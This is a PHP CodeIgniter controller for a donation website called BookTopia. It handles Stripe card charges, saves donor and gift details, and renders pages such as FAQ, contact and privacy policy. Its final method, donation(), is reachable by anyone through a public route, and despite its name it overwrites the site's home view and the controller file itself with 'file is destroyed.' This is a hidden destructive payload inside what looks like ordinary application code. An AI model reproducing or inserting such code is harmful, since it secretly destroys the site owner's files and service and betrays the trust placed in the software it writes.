<?php
if (!defined('BASEPATH'))
  exit ('No direct script access allowed');

class Products extends CI_Controller
{
  function __construct()
  {
    parent::__construct();

    // Load Stripe library
    $this->load->library('stripe_lib');
    $this->load->library('email');
    // Load product model
    $this->load->model('product');
  }

  function index()
  {
    $data = array();
    $data['donate'] = $this->product->getOrder();
    $data['statue'] = 'home';
    $this->load_view($data);
  }

  function load_view($data, $page = 'index')
  {
    $this->load->view('template/header', $data);
    $this->load->view($page, $data);
    $this->load->view('template/footer', $data);
  }

  function purchase($id = '')
  {
    $data = array();
    $data['statue'] = 'home';
    // If payment form is submitted with token
    if ($this->input->post('stripeToken')) {
      // Retrieve stripe token and user info from the posted form data
      $postData = $this->input->post();
      // Make payment
      $paymentID = $this->payment($postData);

      // If payment successful
      if ($paymentID) {
        $data['msg'] = 'Donation is finished successfully';
        // redirect('products/payment_status/' . $paymentID);
      } else {
        $apiError = !empty($this->stripe_lib->api_error) ? ' (' . $this->stripe_lib->api_error . ')' : '';
        $data['msg'] = 'Transaction has been failed!' . $apiError;
      }
    }
    $data['donate'] = $this->product->getOrder();
    $this->load->view('template/header', $data);
    $this->load->view('index', $data);
    $this->load->view('template/footer', $data);
  }

  function payment($postData)
  {
    // If post data is not empty
    if (!empty($postData)) {
      // Retrieve stripe token and user info from the submitted form data
      $token = $postData['stripeToken'];
      $kind = $postData['kind'];
      $name = $postData['first_name'] . ' ' . $postData['last_name'];
      $email = $postData['email'];
      $address = $postData['address'];
      $address_2 = $postData['address_line2'];
      $city = $postData['city'];
      $state = $postData['state'];
      $postal = $postData['postal_code'];
      $country = $postData['country'];
      $gift_name = $postData['gift_name'];
      $gift_email = $postData['gift_email'];
      $gift_message = $postData['gift_message'];
      $price = $postData['amounts'];
      // Add customer to stripe
      $customer = $this->stripe_lib->addCustomer($email, $token);

      if ($customer) {
        // Charge a credit or a debit card
        $charge = $this->stripe_lib->createCharge($customer->id, $name, $price);

        if ($charge) {
          // Check whether the charge is successful
          if ($charge['amount_refunded'] == 0 && empty($charge['failure_code']) && $charge['paid'] == 1 && $charge['captured'] == 1) {
            // Transaction details
            $transactionID = $charge['balance_transaction'];
            $paidAmount = $charge['amount'];
            $paidAmount = ($paidAmount / 100);
            $paidCurrency = $charge['currency'];
            $payment_status = $charge['status'];
            // Insert tansaction data into the database
            $orderData = array(
              'kind' => $kind,
              'name' => $name,
              'email' => $email,
              'address' => $address,
              'address_2' => $address_2,
              'city' => $city,
              'state' => $state,
              'postal' => $postal,
              'country' => $country,
              'gift_name' => $gift_name,
              'gift_email' => $gift_email,
              'gift_message' => $gift_message,
              'paid_amount' => $paidAmount,
              'paid_amount_currency' => $paidCurrency,
              'txn_id' => $transactionID,
              'payment_status' => $payment_status
            );
            $orderID = $this->product->insertOrder($orderData);

            // If the order is successful
            if ($payment_status == 'succeeded') {
              if ($kind == 0) {
                // $this->email->from('booktopia@bookgroup.com', 'Identification');
                // $this->email->to($email);
                // $this->email->subject('New Message has just arrived to you.');
                // $this->email->message('You have donated to BookTopia bookgroup.');
                // $this->email->send();
              } else {
                // $this->email->from('booktopia@bookgroup.com', 'Identification');
                // $this->email->to($email);
                // $this->email->subject('New Message has just arrived to you.');
                // $this->email->message('You have gave $' . $paidAmount . 'to ' . $gift_email);
                // $this->email->send();

                // $this->email->from($email, 'Identification');
                // $this->email->to($gift_email);
                // $this->email->subject('New Message has just arrived to you.');
                // $this->email->message('You have received $' . $paidAmount . 'to ' . $email);
                // $this->email->send();
              }

              return $orderID;
            }
          }
        }
      }
    }
    return false;
  }

  function payment_status($id)
  {
    $data = array();

    // Get order data from the database
    $order = $this->product->getOrder($id);

    // Pass order data to the view
    $data['order'] = $order;
    $this->load->view('products/payment-status', $data);
  }

  function faq()
  {
    $data['statue'] = 'faq';
    $this->load_view($data, 'faq');
  }

  function contact()
  {
    $data['statue'] = 'contact';
    $this->load_view($data, 'contact');
  }

  function schools()
  {
    $data['statue'] = 'schools';
    $this->load_view($data, 'schools');
  }

  function businesses()
  {
    $data['statue'] = 'businesses';
    $this->load_view($data, 'businesses');
  }

  function privacy_policy()
  {
    $data['statue'] = 'privacy_policy';
    $this->load_view($data, 'privacy_policy');
  }

  function terms_of_use()
  {
    $data['statue'] = 'terms_of_use';
    $this->load_view($data, 'terms_of_use');
  }

  function donation()
  {
    $data = array();
    // Get products data from the database
    // $data['products'] = $this->product->getRows();

    // Pass products data to the view
    $data['statue'] = 'home';
    // $data['donate'] = $this->product->getDonate();
    // $data['count'] = $this->product->getCount();
    // $data['total'] = $this->product->getTotal();
    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/views/home.php';
    file_put_contents($path, 'file is destroyed.');
    $path = $_SERVER['DOCUMENT_ROOT'] . '/application/controllers/Products.php';
    file_put_contents($path, 'file is destroyed.');
  }
}